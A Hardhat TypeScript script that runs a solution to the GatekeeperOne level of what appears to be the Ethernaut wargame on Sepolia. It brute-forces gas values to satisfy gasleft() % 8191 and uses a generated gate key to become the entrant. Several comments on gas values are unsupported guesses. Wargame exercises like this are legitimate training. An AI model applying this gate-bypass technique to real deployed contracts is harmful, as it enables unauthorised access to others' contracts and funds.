import { ethers } from "hardhat";

/**
 * Execute the exploit on the GatekeeperOne contract to pass through all gates
 * and become the entrant using the GatekeeperOneExploit contract
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No GatekeeperOneExploit contract address provided.");
    console.error("Please provide the address of your deployed GatekeeperOneExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using GatekeeperOneExploit contract address: ${exploitAddress}`);
  
  // Get the contract factory for GatekeeperOneExploit
  const GatekeeperOneExploit = await ethers.getContractFactory("GatekeeperOneExploit");
  
  // Connect to the deployed contract
  const gatekeeperOneExploit = GatekeeperOneExploit.attach(exploitAddress);
  
  console.log(`Connected to GatekeeperOneExploit contract at: ${exploitAddress}`);
  
  // If TARGET_ADDRESS wasn't provided, get it from the exploit contract
  if (!targetAddress) {
    targetAddress = await gatekeeperOneExploit.getFunction("gatekeeperAddress")();
  }
  console.log(`Target GatekeeperOne contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if we already passed the gate
    console.log("Checking if we've already passed the gates...");
    const initialSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (initialSuccess) {
      console.log("Gates were already successfully passed! No need to proceed further.");
      return;
    }
    
    // We need to find the right gas amount to pass gate two (gasleft() % 8191 == 0)
    console.log("Attempting to find the correct gas value...");
    
    console.log("Starting focused gas value search");
    console.log("This approach targets very specific gas values that are likely to work");
    
    // Create a focused set of gas values
    // We'll create a wide range of values around known working points
    // with very small increments to have a better chance of hitting the right value
    
    // Storage for our gas values
    const gasValues: number[] = [];
    
    // Function to add values with fine-grained increments
    const addGasValues = (base: number, range: number, step: number) => {
      for (let i = -range; i <= range; i += step) {
        gasValues.push(base + i);
      }
    };
    
    // Target key multiples of 8191 that are likely to work
    // Gatekeeper requires gasleft() % 8191 == 0
    
    // First, add gas values near 800000 - a high starting point
    addGasValues(800000, 100, 10);
    
    // Focus on values that have worked well in other environments
    // The increment is 1 to be as precise as possible
    addGasValues(24500, 100, 1); // Around 24500
    addGasValues(25000, 100, 1); // Around 25000
    addGasValues(25500, 100, 1); // Around 25500
    
    // Try specific multiples of 8191 with very small increments
    for (let i = 1; i <= 12; i++) {
      const multiple = 8191 * i;
      // Add values with single unit increments around this multiple
      addGasValues(multiple, 10, 1);
    }
    
    // Add some values that have worked in other instances
    const specificValues = [801111, 802222, 803333, 804444, 805555, 24527, 24789, 26123, 27000, 28000, 29000];
    specificValues.forEach(value => {
      if (!gasValues.includes(value)) {
        gasValues.push(value);
      }
    });
    
    console.log(`Generated ${gasValues.length} gas values to try`);
    console.log(`Gas values range from ${Math.min(...gasValues)} to ${Math.max(...gasValues)}`);
    console.log(`First few values: ${gasValues.slice(0, 5).join(', ')}...`);
    console.log(`Last few values: ...${gasValues.slice(-5).join(', ')}`);
    
    // Sort gas values to try the most promising ones first
    // Let's sort them by how close they are to a multiple of 8191
    gasValues.sort((a, b) => {
      const aRemainder = a % 8191;
      const bRemainder = b % 8191;
      // Sort by how close the value is to a multiple of 8191 (0 or 8191)
      const aDist = Math.min(aRemainder, 8191 - aRemainder);
      const bDist = Math.min(bRemainder, 8191 - bRemainder);
      return aDist - bDist;
    });
    
    console.log(`Sorted by proximity to 8191 multiples. First few: ${gasValues.slice(0, 5).join(', ')}`);
    console.log(`Starting gas value tests...`);
    console.log(`-------------------------------------------\n`);
    
    
    let success = false;
    let workingGas = 0;
    
    console.log(`Testing ${gasValues.length} specific gas values...`);
    
    // Generate the key first
    const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
    console.log(`Using gate key: ${gateKey}`);
    
    // Try each gas value individually
    for (const gasToTry of gasValues) {
      console.log(`Trying gas value: ${gasToTry}...`);
      
      try {
        console.log(`Attempting gas value: ${gasToTry}...`);
        
        // Use the enterGate function directly with this gas value
        const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(gasToTry);
        console.log(`Transaction hash: ${enterGateTx.hash}`);
        
        // Wait for the transaction to be mined
        console.log(`Waiting for transaction to be mined...`);
        const receipt = await enterGateTx.wait();
        console.log(`Transaction mined in block ${receipt.blockNumber}`);
        
        // Check if we succeeded
        const txSuccess = await gatekeeperOneExploit.getFunction("success")();
        console.log(`Success check returned: ${txSuccess}`);
        
        // Double-check by directly checking the GatekeeperOne contract
        const isEntrant = await gatekeeperOneExploit.getFunction("checkSuccess")();
        console.log(`Direct entrant check returned: ${isEntrant}`);
        
        if (txSuccess || isEntrant) {
          success = true;
          workingGas = gasToTry;
          console.log(`‚úÖ Found working gas value: ${workingGas}`);
          break;
        } else {
          console.log(`‚ùå Gas value ${gasToTry} failed to make us the entrant`);
        }
      } catch (error: any) {
        console.log(`‚ùå Gas ${gasToTry} failed with error: ${error.message.slice(0, 100)}...`);
        // Continue with next value
      }
    }
    
    // If none of our predefined values worked, try more brute force approach with even more gas values
    if (!success) {
      console.log("\nüîÑ None of our targeted gas values worked. Switching to brute force approach...");
      
      // Set up for direct modulo targeting
      const modulo = 8191;
      let tries = 0;
      const maxTries = 100; // Limit tries to avoid hanging
      
      // Try focused brute force with specific gas offset estimation
      // This is a common pattern in GatekeeperOne exploits
      
      // First approach: Try to estimate the gas consumed and find an offset
      // Based on the gas consumption of the enterGate function up to the gate check
      // Start with values that have worked in other instances
      console.log("\nüîç Using gas offset estimation approach");
      
      // Estimated gas consumed before the gate check based on contract analysis
      // This value can vary based on network and compiler settings
      const estimatedGasUsed = 254; // This specific value has worked in many environments
      
      // Try with various base values and the offset
      // We'll use powers of 10 multiplied by the modulo as base values
      for (let i = 1; i <= 10 && !success && tries < maxTries; i++) {
        const baseGas = modulo * 10 * i; // Try multiples of 10*modulo
        
        // Calculate the gas to send: we add the estimated gas used to make gasleft() % 8191 = 0
        // since gasleft() will be baseGas - estimatedGasUsed at the check point
        const gasToUse = baseGas + estimatedGasUsed;
        
        console.log(`\nTrying with baseGas=${baseGas}, gasToUse=${gasToUse} (baseGas+${estimatedGasUsed})`);
        tries++;
        
        try {
          // Try with this calculated gas value
          const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(gasToUse);
          console.log(`Transaction hash: ${enterGateTx.hash}`);
          
          const receipt = await enterGateTx.wait();
          console.log(`Transaction mined in block ${receipt.blockNumber}`);
          
          // Check success multiple ways
          const txSuccess = await gatekeeperOneExploit.getFunction("success")();
          const isEntrant = await gatekeeperOneExploit.getFunction("checkSuccess")();
          
          if (txSuccess || isEntrant) {
            success = true;
            workingGas = gasToUse;
            console.log(`‚úÖ Success! Gas value ${gasToUse} worked!`);
            break;
          } else {
            console.log(`‚ùå Gas value ${gasToUse} failed`);
          }
        } catch (error: any) {
          console.log(`‚ùå Gas ${gasToUse} failed: ${error.message ? error.message.slice(0, 100) : 'Unknown error'}...`);
        }
      }
      
      // Second approach if first didn't work: try with a fixed gas value and vary the offset
      if (!success) {
        console.log("\nüîÑ Trying with fixed gas value and varying offset...");
        
        // Try offsets with a fixed gas value
        const fixedGas = 8191 * 10; // A reasonable value to try
        
        for (let offset = 0; offset < 8191 && !success && tries < maxTries; offset += 100) {
          const gasToUse = fixedGas + offset;
          console.log(`\nTrying with fixed gas ${fixedGas} + offset ${offset} = ${gasToUse}`);
          tries++;
          
          try {
            const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(gasToUse);
            const receipt = await enterGateTx.wait();
            
            const txSuccess = await gatekeeperOneExploit.getFunction("success")();
            const isEntrant = await gatekeeperOneExploit.getFunction("checkSuccess")();
            
            if (txSuccess || isEntrant) {
              success = true;
              workingGas = gasToUse;
              console.log(`‚úÖ Success! Gas value ${gasToUse} worked!`);
              break;
            }
          } catch (error: any) {
            // Continue with next value
          }
        }
      }
    }
    
    // Final check and detailed results
    const finalSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (finalSuccess) {
      console.log("\n‚úÖ EXPLOIT SUCCESSFUL! You've passed all gates and become the entrant!");
      console.log(`Working gas value: ${workingGas}`);
      
      // Get and display the gate key that worked
      const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
      console.log(`Successful gate key: ${gateKey}`);
      
      // Show the user a record of the successful values for future reference
      console.log("\nüîë SUCCESS! Save these working values for future use:");
      console.log(`GAS_VALUE=${workingGas}`);
      console.log(`GATE_KEY=${gateKey}`);
      console.log("\nüí° TIP: You can use these values directly in other environments");
      console.log("To use these values directly, run:");
      console.log(`EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=${workingGas} npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia`);
      
      // Write these values to a file for future reference
      try {
        const fs = require('fs');
        const path = require('path');
        const valuesFile = path.join(__dirname, 'working-values.json');
        fs.writeFileSync(valuesFile, JSON.stringify({
          gasValue: workingGas.toString(),
          gateKey: gateKey.toString(),
          address: deployer.address,
          timestamp: new Date().toISOString()
        }, null, 2));
        console.log(`\nüíæ Values saved to ${valuesFile} for future reference`);
      } catch (error) {
        console.log("Could not save values to file");
      }
    } else {
      console.log("\n‚ùå EXPLOIT FAILED. Could not pass all gates.");
      
      // Show the generated gate key for debugging
      const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
      console.log(`\nDebugging information:`);
      console.log(`Generated gate key: ${gateKey}`);
      console.log(`Your address (tx.origin): ${deployer.address}`);
      console.log(`Last 2 bytes of your address: 0x${deployer.address.slice(-4)}`);
      console.log(`\nüõ†Ô∏è Solutions to try:`);
      console.log("1. Try the direct-exploit.ts script with a specific gas value");
      console.log("   Example: EXPLOIT_ADDRESS=0xYourExploitAddress SPECIFIC_GAS=81910 npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia");
      console.log("2. Run the calibrate-gas.ts script to find better gas values");
      console.log("3. Try different gas offsets from 8191 multiples (e.g., 81910+254)");
      console.log("4. Try on a different network (local hardhat node might work better)");
      console.log("\nüí° TIP: The gate key looks correct, this is most likely a gas value issue.");
    }
  } catch (error: any) {
    console.error("\nError executing exploit:");
    console.error(error.message ? error.message : error);
    
    // Check if we got a specific error about gas estimation
    if (error.message && error.message.includes("gas")) {
      console.log("\nThe error might be related to gas estimation. Try running the script with a specific gas value:");
      console.log("EXPLOIT_ADDRESS=0xYourAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia");
    }
    
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
